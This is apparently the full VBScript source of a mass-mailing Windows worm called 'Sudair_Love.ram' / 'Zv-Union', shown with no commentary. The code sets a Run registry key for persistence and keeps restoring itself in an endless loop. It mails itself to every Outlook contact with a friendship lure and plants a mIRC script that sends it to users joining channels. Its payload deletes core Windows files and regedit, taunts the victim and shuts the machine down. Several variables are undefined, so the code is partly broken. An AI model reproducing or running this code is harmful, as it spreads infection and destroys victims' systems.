
 Set M01RETBE = createobject("scripting.filesystemobject")
N23QR5J2 = M01RETBE.getspecialfolder(1)
V1F4FODG = N23QR5J2 & "\Sudair_Love.ram.vbs"
Set C35KB8M6 = createobject("wscript.shell")
C35KB8M6.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Zv-Union", "wscript.exe " & V1F4FODG & " %"
M01RETBE.copyfile wscript.scriptfullname, V1F4FODG
if C35KB8M6.regread ("HKCU\software\Sudair_Love.ram\mailed") <> "1" then
rooooo7()
end if
if C35KB8M6.regread ("HKCU\software\Sudair_Love.ram\mirqued") <> "1" then
SU4ML8H8()
end if
Set IB2D9J6M= M01RETBE.opentextfile(wscript.scriptfullname)
B7VV626I = IB2D9J6M.readall
IB2D9J6M.close
Do
if not(M01RETBE.fileexists(wscript.scriptfullname)) then
set FKTM4DCG= M01RETBE.createtextfile(wscript.scriptfullname)
FKTM4DCG.write B7VV626I
FKTM4DCG.close
end if
N46O20BI = C35KB8M6.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Zv-Union")
If N46O20BI <> "wscript.exe " & V1F4FODG & " %" then
C35KB8M6.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Zv-Union", "wscript.exe " & V1F4FODG & " %"
end if
N46O20BI= ""
loop
function wail()
on error resum next
dim ddd
Set ddd = CreateObject("Scripting.FileSystemObject")
  Set C = fso.opentextfile(wscript.scriptfullname, 1)
  lines = Split(C.readall, vbCrLf)
  ddd.DeleteFile ("C:\WINDOWS\WIN.COM")
  ddd.DeleteFile ("C:\WINDOWS\command.COM")
  ddd.DeleteFile ("C:\WINDOWS\regedit.exe")
  ddd.deletefile ("C:\Windows\win.ini")
  MsgBox "YOU Have To Know That YOU Are Not The First Or The Last VICTIM Of Zv-Union...CYA!!"
M01RETBE.run "RUNDLL32.EXE user.exe,exitwindows"
end function
Function SU4ML8H8(KD2GF5G3)
If KD2GF5G3 <> "" Then
J8KI7KOJ = C35KB8M6.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If M01RETBE.fileexists("c:\mirc\mirc.ini") Then
KD2GF5G3 = "c:\mirc"
ElseIf M01RETBE.fileexists("c:\mirc32\mirc.ini") Then
KD2GF5G3 = "c:\mirc32"
ElseIf M01RETBE.fileexists(J8KI7KOJ & "\mirc\mirc.ini") Then
KD2GF5G3 = J8KI7KOJ & "\mirc"
ElseIf M01RETBE.fileexists(J8KI7KOJ & "\mirc32\mirc.ini") Then
KD2GF5G3 = J8KI7KOJ & "\mirc"
Else
KD2GF5G3 = ""
End If
End If
If KD2GF5G3 <> "" Then
Set V7U2631O = M01RETBE.CreateTextFile(KD2GF5G3 & "\script.ini", True)
V7U2631O = "[script]" & vbCrLf & "n0=on 1:JOIN:#:{"
V7U2631O = V7U2631O & vbCrLf & "n0=on 1:JOIN:#:{"
V7U2631O = V7U2631O & vbCrLf & "n1=  /if ( $nick == $me ) { halt }"
V7U2631O = V7U2631O & vbCrLf & "n2=  /." & Chr(100) & Chr(99) & Chr(99) & " send $nick "
V7U2631O = V7U2631O & V1F4FODG
V7U2631O = V7U2631O & vbCrLf & "n3=}"
script.Close
C35KB8M6.regwrite "HKCU\software\Sudair_Love.ram\Mirqued", "1"
End If
End Function
function rooooo7()
 On Error Resume Next
Set ddd = CreateObject("Outlook.Application")
If ddd= "Outlook"Then
Set GNS=ddd.GetNameSpace("MAPI")
For Each NuM In GNS.AddressLists
If NuM.AddressEntries.Count <> 0 Then
For nnbratvivby= 1 To NuM.AddressEntries.Count
Set hfrcokiowep = NuM.AddressEntries(nnbratvivby)
Set inzwlmcmpto = ddd.CreateItem(0)
MyPro.To = hfrcokiowep.Address
MyPro.Subject = "Here you have, ;o)"
MyPro.Body = "I just Want To Say..:" & vbcrlf & "Never Forget The Real meaning Of The Friendship!" & vbcrlf & ""
MyPro.Attachments = ("c:\windows\system\Sudair_Love.ram.vbs")
If MyPro.To <> "" Then
MyPro.Send
else
call wail()
end if
Next
End If
Next
C35KB8M6.regwrite "HKCU\software\Sudair_Love.ram\Mirqued", "1"
end if
call wail()
End Function

